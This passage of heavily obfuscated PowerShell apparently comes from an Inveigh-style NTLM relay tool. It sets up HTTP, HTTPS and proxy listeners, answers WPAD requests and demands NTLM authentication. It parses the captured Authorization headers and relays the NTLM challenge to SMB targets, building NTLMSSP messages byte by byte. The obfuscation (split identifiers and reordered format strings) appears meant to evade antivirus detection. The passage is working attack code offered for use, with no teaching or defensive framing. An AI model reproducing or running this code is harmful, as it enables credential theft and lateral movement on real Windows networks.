                            ${NEtbIo`s_DOMAi`N_`By`TEs} + 
                            0x01,0x00 +
                            ${HOST`NA`Me_`LeNGth} +
                            ${Ho`sT`NAmE_BytES} +
                            0x04,0x00 +
                            ${dN`s_d`O`mAiN_LE`NGTh} +
                            ${D`N`s_doMaIn`_bY`TEs} +
                            0x03,0x00 +
                            ${dnS_H`oSTNA`m`e`_`LENGTH} +
                            ${DN`S_Ho`sT`N`AmE_bYteS} +
                            0x05,0x00 +
                            ${DN`s_`do`mAIN_`lENG`Th} +
                            ${D`N`S_d`OMaIn`_bYteS} +
                            0x07,0x00,0x08,0x00 +
                            ${H`Tt`p_TI`meS`TaMp} +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        ${N`T`L`M_Cha`lLENg`E_ba`se64} =   (  &("{2}{0}{1}{3}"-f 'V','ARi','gEt-','ABle')  4Vxn -vALuEoNl)::"tOb`AsE64St`RiNG"(${Http`_Nt`Lm`_b`yTES})
        ${nt`Lm} = ("{0}{1}"-f'NT','LM ') + ${ntlm_c`hal`LEnGe_ba`sE`64}

        return ${Nt`lm}
    }

    if(${htt`Ps_LI`sTEneR})
    {
        ${H`T`TP_tYpe} = ("{1}{0}" -f'PS','HTT')
    }
    elseif(${p`R`oXy_lIstENeR})
    {
        ${h`T`TP_t`yPE} = ("{0}{1}"-f 'Pr','oxy')
    }
    else
    {
        ${httP`_TY`Pe} = ("{1}{0}"-f 'P','HTT')
    }

    if(${ht`TPIp} -ne ("{1}{0}" -f '.0.0','0.0'))
    {
        ${ht`Tp`ip} =   (  &("{1}{0}"-f'E','VaRiAbL')  ktB -valUE)::("{0}{1}"-f 'Pars','e').Invoke(${hTt`P`ip})
        ${HttP_E`N`DPoINt} = &("{1}{2}{0}{3}"-f'ec','New-O','bj','t') ("{0}{3}{4}{1}{2}{5}" -f 'Syst','IP','En','em.N','et.','dPoint')(${HT`TpIP},${HTTPp`O`Rt})
    }
    else
    {
        ${hTT`p_e`N`DpoInT} = &("{0}{1}{2}"-f 'N','ew-Obje','ct') ("{0}{1}{2}{3}{4}"-f 'Sys','t','em.Net.I','PEndPo','int')( (&("{2}{0}{1}{3}" -f 't','-VARIaB','ge','lE')  ('kt'+'b')).vALUE::"A`Ny",${Ht`TPp`oRt})
    }

    ${h`Ttp_R`U`NNING} = ${TR`UE}
    ${hTt`p_`lisTeNeR} = &("{3}{0}{1}{2}"-f 'w-','Objec','t','Ne') ("{5}{0}{1}{3}{2}{4}"-f 'et.','Socke','List','ts.Tcp','ener','System.N') ${hTTp_e`N`dPO`INT}
    ${P`Ro`Ces`s_`Id_bytES} = &("{2}{1}{3}{0}"-f'ssIDArray','c','Get-Pro','e')
    ${r`El`Ay`_stEp} = 0

    if(${p`ROXY_li`StEN`er})
    {
        ${Htt`P_liN`GeR} = &("{0}{3}{1}{2}"-f 'N','w-O','bject','e') ("{7}{3}{6}{2}{0}{5}{1}{4}" -f't.Socke','s.Linger','e','yste','Option','t','m.N','S')(${T`RuE},0)
        ${hTt`P`_`lISTEN`Er}."se`RveR"."l`IN`Ge`RsTATe" = ${h`TTp_`LiN`ger}
    }

    try
    {
        ${http`_LiSTEn`ER}.("{1}{0}" -f 'tart','S').Invoke()
    }
    catch
    {
        ${INv`E`igh}."outP`UT_`Que`UE"."a`DD"(("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener "))
        ${hT`TP_rU`NN`ING} = ${f`A`lSe}

        if(${INV`EI`GH}."fiL`e_out`PUt")
        {
            ${in`VE`IgH}."LO`g_fil`e_`QuE`UE"."A`DD"(("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener "))
        }

        if(${i`Nv`eIgh}."lO`G_`oUt`put")
        {
            ${i`NVE`Igh}."L`oG"."A`Dd"(("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener "))
        }

    }

    :HTTP_listener_loop while(${iN`VEi`GH}."RE`LaY`_ru`Nn`iNG" -and ${Ht`Tp`_r`Un`Ning})
    {
        ${Tc`P`_rEqU`esT} = ${N`ULL}
        ${Tc`P_Requ`es`T_B`YteS} = &("{1}{3}{2}{0}" -f 'ect','N','w-Obj','e') ("{2}{1}{3}{0}" -f '[]','stem.','Sy','Byte') 4096
        ${h`Ttp`_SENd} = ${tr`Ue}
        ${hTTP`_hEa`DE`R_`cO`NtenT_tY`pe} =   (&("{1}{0}{2}" -f 'ITe','GEt-','m')  ("Vari"+"a"+"blE:Ix"+"gd")).vAlue::"U`Tf8".("{0}{1}"-f 'GetB','ytes').Invoke(("{4}{2}{3}{5}{1}{0}" -f '/html','t','o','ntent-T','C','ype: tex'))
        ${htTp_`heaDEr`_cA`CHE`_Con`TRoL} = ${N`UlL}
        ${HtTP_`he`AdeR_aU`THenTica`Te} = ${n`Ull}
        ${Ht`T`P_`heADER`_`AUTHE`Nti`c`ATe_Data} = ${NU`LL}
        ${Htt`P_m`eS`s`AGe} = ''
        ${Ht`TP`_`hEa`Der`_`AUTHo`RIzAtIOn} = ''
        ${htTP_`h`eA`D`er_`HoST} = ${nu`Ll}
        ${hTtP_`heA`D`ER`_USER_AgE`Nt} = ${NU`ll}
        ${h`T`TP_ReQueST_`Ra`W`_url} = ${nu`lL}
        ${nt`lm} = ("{1}{0}"-f'TLM','N')
        
        if(!${HT`TP_`C`LiENt}."coN`Nect`ed" -and ${iN`VeI`GH}."R`eL`AY_RU`NN`ING")
        {
            ${HTTP_`CL`ie`N`T_ClOsE} = ${Fal`SE}
            ${HTtp`_aS`Y`Nc} = ${ht`TP_`L`istEnER}.("{4}{2}{3}{1}{0}{5}" -f'pClie','c','Accep','tT','Begin','nt').Invoke(${n`UlL},${Nu`lL})

            do
            {

                if(!${IN`V`EiGH}."rELA`Y_r`Un`NiNg")
                {
                    break ("{0}{4}{2}{1}{3}" -f 'HTTP_','ener_lo','st','op','li')
                }

                &("{1}{3}{0}{2}"-f 'Sle','St','ep','art-') -m 10
            }
            until(${H`Tt`p_aS`ync}."IsCOM`P`leTED")

            ${HtTP`_CLie`Nt} = ${HtTp_lIS`TEn`Er}.("{0}{1}{4}{3}{2}"-f'E','ndAccep','ient','pCl','tTc').Invoke(${hTTP`_a`SY`NC})
            ${HtT`p`_clI`EnT_han`dL`e`_O`Ld} = ${htTp_`Cl`I`EnT}."C`liEnt"."han`dle"
            
            if(${HTtPs`_`liSte`Ner})
            {
                ${H`TtP_c`Lear`_S`TR`Eam} = ${HT`T`p_cLI`ENT}.("{0}{1}{2}"-f'Ge','tStre','am').Invoke()
                ${hTt`P_S`TReAM} = &("{3}{2}{0}{1}" -f'c','t','w-Obje','Ne') ("{0}{4}{5}{3}{1}{2}"-f 'Sys','lSt','ream','rity.Ss','te','m.Net.Secu')(${H`T`Tp`_clE`Ar`_StREam},${faL`Se})
                ${ss`l_C`eRT} = (&("{0}{2}{3}{1}"-f'Ge','tem','t','-ChildI') ((("{7}{0}{6}{2}{5}{1}{4}{3}" -f'e','0}Loc',':','ne{0}My','alMachi','{','rt','C'))  -F  [ChAr]92) | &("{1}{0}{2}{3}" -f'ere-Ob','Wh','je','ct') {${_}."S`UbJEcT" -match ${I`NVeIGh}."cErtifiCA`Te_`cN"})
                ${HTt`P_sTr`EaM}."AuthEnTiC`AteasSe`R`VeR"(${sS`L_C`ERT},${f`ALSE}, (&("{1}{3}{2}{0}" -f 'E','G','ARiABL','eT-V')  ('hp0D'+'w')  -vaLue)::"dEfA`Ult",${f`AL`se})
            }
            else
            {
                ${ht`Tp_`Stre`AM} = ${HT`Tp_ClI`e`Nt}.("{1}{2}{0}{3}"-f'tre','G','etS','am').Invoke()
            }
            
        }
        
        if(${rE`lAy`_St`eP} -gt 0)
        {
            ${rEL`Ay_`Res`eT}++

            if(${r`EL`AY_reSet} -gt 2)
            {
                ${iN`V`EIGH}."oUT`put_`qUE`Ue"."A`DD"(("[!] [$(Get-Date -format s)] Relay attack resetting ")) > ${N`Ull}
                ${R`elA`y_`StEp} = 0
            }

        }
        else
        {
            ${RelAy_`R`es`ET} = 0
        }

        if(${H`T`TPs`_Li`STENer})
        {
            [Byte[]]${SsL_`R`e`QUES`T_BytEs} = ${n`ULl}

            while(${HTTP_CL`E`Ar_`sTReaM}."DaTaAVAi`l`AblE")
            {
                ${htTp`_r`EQ`UEST_B`ytE`_cOUNT} = ${hTtp`_s`TREam}.("{0}{1}"-f 'Rea','d').Invoke(${tcp_Req`U`eSt_`By`TES},0,${t`CP`_`RE`qUE`ST_BYtEs}."LeNG`Th")
                ${sSl_Re`Quest`_byT`es} += ${t`c`p_`R`eQUesT_bYT`Es}[0..(${h`Ttp_`REQueSt_B`yT`e_`CoUnt} - 1)]
            }

            ${TCp`_r`EQuEst} =  (  &("{0}{1}{2}" -f 'vA','R','iablE')  xv8qnb).vAlUE::("{2}{0}{1}" -f 'i','ng','ToStr').Invoke(${sSl`_rEq`UEs`T_BYt`eS})
        }
        else
        {
            
            while(${hTTp`_sTR`eAM}."DA`Ta`Av`AiLabLe")
            {
                ${HtTP_sT`Re`Am}.("{1}{0}"-f'ead','R').Invoke(${t`CP_re`quEsT_by`TeS},0,${tcP_R`equEs`T_by`TES}."L`eNGtH") > ${nU`ll}
            }

            ${TcP`_r`e`QuEst} =   ( &('LS') ('vA'+'RIABlE:Xv8'+'qnB') ).VaLue::("{2}{1}{0}" -f'g','Strin','To').Invoke(${TC`P`_RequE`St`_Bytes})
        }
        
        if(${tCp_`Re`quest} -like ("{1}{2}{0}"-f'-20*','47-','45-54') -or ${tCp_`Re`qUEST} -like ("{2}{1}{3}{0}"-f'*','-4','48','5-41-44-20') -or ${TCP_Requ`E`st} -like ("{5}{0}{3}{4}{1}{2}{6}" -f'f-50','4f-4e-','53-20','-5','4-49-','4','*') -or ${t`cP_Req`UEST} -like ("{6}{0}{3}{4}{2}{5}{1}"-f'3-','4*','e-','4f-4e','-4','45-43-5','4'))
        {
            ${ht`Tp_R`Aw_U`RL} = ${T`Cp_`Req`UEst}.("{0}{2}{1}" -f'Subs','ing','tr').Invoke(${TC`p_r`eQUeST}.("{0}{2}{1}"-f'In','Of','dex').Invoke(("{1}{0}" -f'0-','-2')) + 4,${tCP`_Re`qu`eSt}.("{1}{2}{0}"-f 'ing','Su','bstr').Invoke(${T`CP_RE`Que`ST}.("{2}{0}{1}"-f'nd','exOf','I').Invoke(("{0}{1}" -f '-2','0-')) + 1).("{0}{2}{1}"-f'Ind','f','exO').Invoke(("{0}{1}" -f'-2','0-')) - 3)
            ${HT`Tp_raw`_uRl} = ${http`_r`Aw_url}.("{0}{1}"-f 'Spl','it').Invoke("-") | &("{0}{2}{1}" -f'For','ject','Each-Ob'){[Char]  ( &("{0}{1}" -f 'iT','EM')  ("VariAb"+"L"+"e:4vxn")).vALuE::("{0}{1}{2}"-f 'ToI','nt','16').Invoke(${_},16)}
            ${HT`TP_rEq`UEST`_rAw_U`RL} = &("{2}{1}{0}" -f'ect','Obj','New-') ("{2}{4}{0}{3}{1}" -f 'em.S','ing','S','tr','yst') (${h`T`Tp_raw`_U`RL},0,${htTp`_raW`_`URl}."LE`N`gth")
            ${hTtp_sour`C`e_iP} = ${H`Ttp_cl`i`ENt}."Cl`IENt"."re`MoTeeND`p`OINt"."ad`D`RESs"."IpA`DDRESStosT`RI`NG"
            ${h`T`TP_So`UrcE_p`ORt} = ${hT`TP`_CLI`Ent}."Cl`IeNT"."RemO`TE`eN`dPOINT"."po`Rt"
            ${HtT`P_cOnN`Ec`TIoN`_`heADer_`CLOsE} = ${T`RUE}

            if((${T`CP_REqu`EST}).("{2}{0}{1}" -f 'tartsWi','th','S').Invoke(("{2}{1}{0}"-f '-54-20','45','47-')))
            {
                ${h`T`Tp_METhOd} = "GET"
            }
            elseif((${t`cP_`REQUe`sT}).("{2}{1}{0}" -f 'tsWith','ar','St').Invoke(("{0}{2}{1}{3}" -f'48','-41','-45','-44-20')))
            {
                ${Ht`T`P_mET`HoD} = ("{1}{0}" -f 'EAD','H')
            }
            elseif((${Tcp_RE`QU`ESt}).("{1}{2}{0}{3}" -f's','S','tart','With').Invoke(("{2}{3}{0}{1}{4}" -f '9-','4F-4E-5','4f-','50-54-4','3-20')))
            {
                ${htTP_`met`H`od} = ("{1}{0}" -f 'S','OPTION')
            }
            elseif((${tCp_r`EQ`U`EST}).("{2}{0}{1}" -f 'tsW','ith','Star').Invoke(("{1}{5}{2}{0}{4}{3}" -f '-4E-','43','4E','-54','45-43','-4F-')))
            {
                ${http_`M`E`Thod} = ("{1}{0}" -f'T','CONNEC')
            }

            if(${tc`p_`ReQu`EsT} -like ("{0}{4}{3}{2}{1}" -f'*','-74-3A-20-*','-6F-73','48','-'))
            {
                ${h`TtP_hEAD`eR_`hos`T`_eX`TR`AcT} = ${TCp`_re`QUesT}.("{3}{0}{1}{2}" -f 'st','rin','g','Sub').Invoke(${tcp_`ReQ`UEst}.("{0}{1}"-f'Ind','exOf').Invoke(("{4}{2}{0}{6}{5}{3}{1}"-f '3-','-','8-6F-7','0','-4','2','74-3A-')) + 19)
                ${Http_HEADer_H`O`St_`E`x`TRA`cT} = ${HT`TP_heADer_host`_eX`T`RaCT}.("{0}{1}"-f'S','ubstring').Invoke(0,${HT`T`P_hEaDE`R`_HosT_EXtR`A`ct}.("{1}{0}" -f 'f','IndexO').Invoke(("{0}{1}"-f '-','0D-0A-')))
                ${HTt`P_hEADer_`H`O`sT_`ExT`RA`ct} = ${httP_h`EADEr_h`OS`T_exT`RacT}.("{1}{0}"-f'plit','S').Invoke("-") | &("{0}{2}{1}" -f'Fo','-Object','rEach'){[Char] (&("{2}{0}{1}" -f'Ab','LE','vARI')  ('4VX'+'n')  -VAlUEoNly)::("{0}{2}{1}" -f'T','6','oInt1').Invoke(${_},16)}
                ${h`TT`P_H`EaD`ER_HosT} = &("{0}{2}{1}"-f'N','Object','ew-') ("{0}{3}{1}{2}{4}"-f 'S','t','em.Stri','ys','ng') (${HttP`_hEadE`R`_Host`_Ex`Tra`CT},0,${Ht`TP`_HEADE`R_`host_`e`XtRACt}."l`ENGth")
            }

            if(${TCP`_REq`UeST} -like ("{3}{6}{1}{2}{0}{5}{4}"-f'-72-2D','6','5','*-','E-74-3A-20-*','-41-67-65-6','55-73-'))
            {
                ${hTTP`_heaD`er_UseR_a`gENT_E`X`T`R`AcT} = ${t`Cp_rE`Q`UeSt}.("{1}{2}{0}" -f 'ing','Subst','r').Invoke(${tcP`_ReQU`EST}.("{1}{0}" -f 'xOf','Inde').Invoke(("{7}{1}{2}{9}{3}{8}{6}{5}{4}{0}" -f '0-','5','-72-2D','67-65','-2','-3A','4','-55-73-6','-6E-7','-41-')) + 37)
                ${hTT`P_he`ADEr`_uS`Er`_`A`GENT_`EXTRact} = ${http_`HEaDE`R_uSE`R_A`G`EN`T_e`xtRaCt}.("{1}{0}" -f'ng','Substri').Invoke(0,${hTtp`_`hEader_`UsE`R_AgEN`T_EXTr`ACT}.("{1}{0}"-f'dexOf','In').Invoke(("{2}{1}{0}"-f 'A-','0D-0','-')))
                ${H`TTP_he`A`deR_`Use`R_aGeN`T_e`x`TRAcT} = ${H`T`Tp_HEade`R_`USe`R_AgE`Nt_E`Xtr`A`Ct}.("{1}{0}" -f 'lit','Sp').Invoke("-") | &("{2}{3}{0}{1}{4}" -f'Ob','jec','ForE','ach-','t'){[Char]  $4Vxn::("{1}{0}" -f 'nt16','ToI').Invoke(${_},16)}
                ${H`T`TP`_HeaDER`_use`R_agE`Nt} = &("{2}{3}{0}{1}" -f 'jec','t','N','ew-Ob') ("{2}{3}{1}{0}" -f'ring','.St','S','ystem') (${HTtP`_`hEadE`R`_USER_`AgeNt_`EXtrACt},0,${HtTp_HeaD`er`_U`Ser_A`GEnt_Ex`TRAct}."len`gTH")
            }

            if(${h`Ttp`_ReQ`UESt_`RAW_UrL_old} -ne ${hT`TP_R`Equ`Es`T_Raw`_`URL} -or ${h`Ttp`_cL`ieNT_`ha`Nd`le_O`LD} -ne ${hT`Tp`_clieNT}."cLi`ENt"."HaN`DLE")
            {
                ${in`Vei`GH}."out`PuT_Q`U`Eue"."a`dd"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP ")) > ${n`ULL}
                ${inv`Ei`GH}."o`UtpUT_`quE`UE"."A`Dd"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP ")) > ${NU`ll}

                if(${HTtp_`He`AD`e`R_uSe`R_`AgE`Nt})
                {
                    ${inv`eIgH}."O`U`TpuT`_qUeUe"."a`dD"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent ")) > ${nu`ll}
                }

                if(${Pr`o`XY} -eq 'Y' -and ${P`R`OxY`igNoRE}."cOu`NT" -gt 0 -and (${P`RoXYIgn`ore} | &("{2}{1}{3}{0}" -f 'Object','ere','Wh','-') {${Ht`Tp_HE`Ad`E`R`_uS`eR_AgENt} -match ${_}}))
                {
                    ${IN`Ve`igH}."oUTp`Ut_`qUEuE"."A`DD"(("[+] [$(Get-Date -format s)] - $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent from $HTTP_source_IP ")) > ${n`ULL}
                }

            }

            if(${TcP_`RE`qU`ESt} -like ("{8}{3}{4}{7}{1}{6}{5}{2}{0}"-f'A-20-*','72-','A-61-74-69-6F-6E-3','-','41-75-74-68','9-7','6','-6F-','*'))
            {
                ${H`Ttp`_heADeR_AuTh`ORI`Z`ATi`ON`_eXT`R`ACt} = ${tCp_R`equ`e`sT}.("{0}{2}{1}"-f'Su','ng','bstri').Invoke(${TcP`_rEQ`UE`St}.("{0}{1}"-f 'Inde','xOf').Invoke(("{12}{0}{4}{6}{7}{1}{2}{3}{9}{11}{8}{13}{10}{5}" -f '6','-','7A-','6','F-72','6E-3A-20-','-','69','69-6','1-7','-','4-','-41-75-74-68-','F')) + 46)
                ${H`TtP_h`E`ADER_Au`ThoriZA`Ti`On_`EXTRA`CT} = ${hTtp`_`header`_AUThO`RizATIO`N_`EXTR`ACT}.("{1}{2}{0}"-f 'ing','Subs','tr').Invoke(0,${Http_H`EADER`_`AuthOr`iZa`T`iOn`_eX`TRA`cT}.("{1}{0}" -f'Of','Index').Invoke(("{1}{0}"-f '-0A-','-0D')))
                ${H`TT`p_HE`ADER`_aUthorI`zAT`ION_extRaCt} = ${h`TT`p_hEAd`Er_AU`TH`oriZATI`ON_exTRACt}.("{1}{0}"-f 'plit','S').Invoke("-") | &("{1}{0}{2}{3}" -f 'rEac','Fo','h-','Object'){[Char] $4Vxn::("{0}{1}" -f'ToInt','16').Invoke(${_},16)}
                ${hTTp_`H`EAdEr_AUThORi`ZAT`ION} = &("{1}{0}{2}"-f 'bje','New-O','ct') ("{2}{1}{0}" -f'String','tem.','Sys') (${HTtp_He`AdE`R_aUtH`ORi`zAtIO`N_eX`Tract},0,${HT`Tp_`he`A`D`ER_AUTHO`R`IZatIoN_`e`xTra`CT}."len`GTH")
            }

            if((${htTP_re`queST_`RA`w`_uRl} -notmatch ("{0}{1}{2}"-f '/wp','ad.','dat') -and ${hTt`pAu`Th} -eq ("{1}{2}{0}"-f 's','Anony','mou')) -or (${h`TtP_REquest`_`R`Aw_urL} -match ("{2}{0}{1}"-f'wpad.','dat','/') -and ${wpad`AuTh} -eq ("{0}{1}{2}" -f 'A','nony','mous')) -or (
            ${h`Tt`P_rEqU`e`st_RAW_urL} -match ("{1}{0}" -f 'pad.dat','/w') -and ${Wp`ADAU`Th} -like ("{1}{0}" -f '*','NTLM') -and ${wP`A`d`AutH`igNORE}."coU`Nt" -gt 0 -and (${w`P`AdAuTh`IgnOrE} | &("{1}{2}{0}"-f'-Object','Wher','e') {${httP_h`EADeR_Us`er_Age`NT} -match ${_}})))
            {
                ${H`T`Tp_Re`Sp`oNsE_S`Tatus_`cO`de} = 0x32,0x30,0x30
                ${H`TT`P_RE`SPoNse`_`P`HRASE} = 0x4f,0x4b
                ${ht`TP`_ClieN`T`_`CLOse} = ${tr`UE}
            }
            else
            {
                
                if(${p`RO`X`y_l`isteNER})
                {
                    ${H`TtP`_reS`PONSe_sTaTuS`_C`oDE} = 0x34,0x30,0x37
                    ${htTp_HEADEr_a`UT`h`en`T`ic`A`Te} = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    ${h`Ttp_ReSP`oNSE_S`T`At`US_C`ODe} = 0x34,0x30,0x31
                    ${ht`TP_heADE`R_aUTH`e`Nt`I`C`Ate} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }

                ${HtTP_RE`SpO`NSE_`pHR`ASe} = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
        
            if(${HT`TP_`hE`A`de`R_AU`T`HorizatioN}.("{1}{2}{0}"-f'ith','Starts','W').Invoke(("{0}{1}"-f 'NTLM',' ')))
            {
                ${HT`Tp`_H`eADer_`AUthOr`iZ`AtioN} = ${HtTP`_H`e`Ad`er_aUThORi`ZATIoN} -replace ("{1}{0}"-f'TLM ','N'),''
                [Byte[]]${hTTP_REquesT_b`y`T`eS} =  ( &('ls')  ("V"+"ar"+"IA"+"BLE:4vX"+"n")  ).vALuE::("{1}{0}{4}{3}{2}"-f'romB','F','ng','tri','ase64S').Invoke(${hT`Tp_h`eade`R_AUThoRI`Za`TiOn})
                ${htT`p_`ConNECtioN_HEa`d`E`R`_`c`LoSE} = ${F`ALSE}
            
                if(  ( &("{2}{1}{0}" -f'E','RIAbl','GET-VA') xV8qnB  -VAL )::"ToS`T`RING"(${http_Re`q`UesT_bY`TES}[8..11]) -eq ("{2}{1}{0}" -f'0-00','-0','01-00'))
                {
                    
                    if(${Invei`gH}."Smb_rel`Ay" -and ${RelAy`_`sTEP} -eq 0)
                    {
                        ${i`NV`eIGh}."ouT`pU`T_`QuEUe"."a`dd"(("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) to SMB relay initiated by $HTTP_source_IP ")) > ${N`ULL}
                        ${sMB_Co`N`Ne`Ct} = &("{1}{0}{3}{2}" -f '-','Invoke','t','SMBConnec') ${p`ROcESS_iD_b`y`TeS} ${hTT`p_SOUr`c`e_IP}
                        ${TARG`et} = ${sM`B_c`o`NNeCt}[1]
                        ${sMB_CL`i`E`Nt} = ${SMb`_c`OnN`ECt}[0]
                    
                        if(!${tar`geT})
                        {
                            ${i`NveI`GH}."OU`Tput_`quEUE"."A`dd"(("[-] [$(Get-Date -format s)] Eligible target not found ")) > ${nu`ll}
                            ${R`E`lay_`sTep} = 0
                        }
                        elseif(!${sM`B_`CLiE`NT}."cON`NEc`TeD")
                        {

                            for(${I} = 0;${i} -lt ${iNv`Ei`gH}."E`NumE`Rate"."Co`Unt";${I}++)
                            {
                
                                if(${iN`V`EIGH}."ENUME`Ra`TE"[${I}]."iP" -eq ${tAR`Get} -and !${i`N`VEiGh}."E`Num`e`RaTe"[${i}]."Signing")
                                {
                                    ${InvE`IGh}."OUT`put_Q`U`EUE"."a`dD"(("[-] [$(Get-Date -format s)] Relay target $target is not responding ")) > ${n`ULl}
                                    break
                                }
                
                            }
                            
                            ${Re`la`y_st`ep} = 0
                        }
                        else
                        {
                            ${rEL`Ay`_SteP} = 1
                        }

                        if(${r`elAy`_`StEp} -eq 1)
                        {
                            ${SMb_`R`elay`_BYTES} = &("{6}{4}{5}{2}{3}{7}{0}{1}" -f'yChalleng','e','SMB','Rel','nvo','ke-','I','a') ${sMB_`c`lie`NT} ${ht`Tp`_RequEsT_B`YteS} ${SMb`_veR`S`IoN} ${prO`C`E`S`s_ID_b`yTes}

                            if(${Sm`B`_Rela`Y_bYTeS}."lE`NGth" -le 3)
                            {
                                ${ReLAY`_s`TEP} = 0
                                ${HTt`P_`cL`IEnt_`CLosE} = ${T`RuE}
                                ${NT`Lm} = &("{0}{1}{4}{5}{2}{3}" -f 'Get','-N','allengeBa','se64','T','LMCh') ${CH`AlLE`Nge} ${H`TTP`_soUrC`e_iP} ${HT`Tp`_CL`IenT}."c`LIent"."RE`mot`eEND`Po`InT"."p`oRT"
                            }

                        }

                        if(${Rel`A`y_s`TEP} -eq 1)
                        {
                            ${SMb_`U`SER_id} = ${smb`_REla`y_b`YtEs}[34..33]
                            ${smB_RE`lAy`_`NTl`Mssp} =   ( &("{1}{2}{0}{3}" -f'a','GEt','-V','RIaBle')  XV8QnB).vAluE::("{2}{0}{1}" -f'oStr','ing','T').Invoke(${Smb_r`Elay_`B`Ytes})
                            ${s`MB_R`E`lay_ntLMS`sP} = ${sM`B_reLA`y_`Nt`LMs`sp} -replace "-",""
                            ${smB_RELAY`_N`TLMSs`P`_iN`dEx} = ${sM`B`_rELay_`Nt`LmssP}.("{0}{1}" -f'In','dexOf').Invoke(("{3}{4}{0}{1}{2}" -f '3','500','0','4','E544C4D535'))
                            ${sm`B_`Relay`_N`T`LMSSp`_ByteS_iN`dEx} = ${S`mb_`RELay`_`NT`lMsSP_`InDEx} / 2
                            ${sMb_Do`m`AIN`_l`eN`GTh} = &("{2}{0}{3}{1}"-f 'nt16D','th','Get-UI','ataLeng') (${s`MB_R`E`lAy_Nt`lmsSp`_ByT`es_`I`NdeX} + 12) ${sM`B_rEL`A`y_b`ytEs}
                            ${S`M`B_dOMaIN_Le`N`GTh_OFFsEt_bY`TEs} = ${smB_`RElaY`_byt`eS}[(${SMb_`RElAY_Nt`Lmss`P`_byTE`S_iNdeX} + 12)..(${S`M`B_rE`L`A`Y_N`TlmSSP_`BYTe`s_INdEX} + 19)]
                            ${sMb`_tArg`et`_l`engTH} = &("{0}{1}{4}{3}{2}"-f'G','et','aLength','UInt16Dat','-') (${sMb_r`eLAY_`Ntl`MsSp_b`y`T`es_`In`dex} + 40) ${Smb_R`e`la`Y`_byTEs}
                            ${S`mb`_TarGE`T_lENGtH_OFFsEt`_b`yTes} = ${SMb`_r`eLa`Y`_ByTES}[(${sM`B_`R`elAY_nTL`mss`P_`Bytes_`iNDex} + 40)..(${s`Mb_ReLa`y`_Nt`L`mssp`_by`TEs_`i`NdEx} + 55 + ${Sm`B`_`domain_`leNG`TH})]
                            ${Smb_R`eLAy_TAr`GeT`_f`laG} = ${SMb_r`EL`AY_byteS}[(${s`M`B_RelAY_n`T`lM`s`Sp_By`TeS_I`NDEx} + 22)]
                            ${sMB_R`e`l`Ay_`NtlM_C`ha`LLe`NGE} = ${s`m`B`_Rela`Y_byteS}[(${S`m`B_r`ELAy`_NtLmssp_bYTes_In`dEX} + 24)..(${smB_`Re`LAY_ntL`MSSp_`B`Yte`S_index} + 31)]
                            ${smb`_Re`lay_tA`RgEt_D`ETaILS} = ${Smb_rElA`y_`B`y`TES}[(${SM`B_rELay_ntlmS`sp`_ByT`eS_`I`NdEX} + 56 + ${smB_DoMA`iN_`l`ENgth})..(${sMb`_RELAy_`NTlms`sp`_BYT`ES_`indEx} + 55 + ${sM`B_DoMain_L`e`NgTh} + ${smb_TA`Rge`T`_l`Ength})]
                            ${s`e`ssION`_ID} = ${smb`_`ReLAY_B`yt`es}[44..51]
                    
                            ${Http_`Nt`Lm`_B`ytEs} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                               ${sm`B_dom`Ai`N_le`NgT`H_OFfS`ET_BYteS} +
                                               0x05,0x82 +
                                               ${Smb_r`El`Ay_TArGet`_`FLag} +
                                               0xa2 +
                                               ${SMb_`RelaY`_`Ntl`M_chALLENGe} +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                               ${SmB_`Tar`gE`T`_LE`N`gtH_ofFsET_bY`Tes} +
                                               ${smB_r`eLaY`_tARg`ET`_`det`AILs}
                    
                            ${n`TL`M_`ChaLlE`NgE_Base`64} =   (&("{1}{0}"-f'lE','vaRIaB')  ("4v"+"xN")).vaLUE::"To`BaSE64s`T`Ri`Ng"(${htt`p`_N`Tlm_bytES})
                            ${NT`Lm} = ("{1}{0}" -f ' ','NTLM') + ${ntlM_cHAll`EN`gE`_Ba`se64}
                            ${nT`LM`_challE`NgE} = &("{4}{1}{2}{0}{3}{6}{5}"-f'NTLMCh','S','MB','allen','Get-','e','g') ${sMB`_r`elAy_`B`ytes}

                            if(!${inV`eI`gH}."hTTP`_`sES`SIoN_TA`Ble".("{1}{2}{0}"-f'y','Contai','nsKe').Invoke("$ClientIPAddress`:$ClientPort"))
                            {
                                ${INvE`i`Gh}."HTTp_`sESS`iOn_`TA`B`le".("{1}{0}" -f'dd','A').Invoke("$ClientIPAddress`:$ClientPort",${h`TTP_CHA`LlE`N`ge})
                            }
                            else
                            {
                                ${I`NVeiGh}."HTTP_ses`sIo`N_t`A`BLe"["$ClientIPAddress`:$ClientPort"] = ${H`Ttp_chA`l`lE`NGe}
                            }

                            ${inVe`I`gh}."O`UTpuT`_quEUe"."A`dD"(("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target ")) > ${Nu`Ll}
                            ${i`NvE`IGH}."oUtpU`T_QU`eUe"."A`dD"(("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP ")) > ${N`ULL}
                            ${R`eL`A`y_STep} = 2
                        }
                        else
                        {
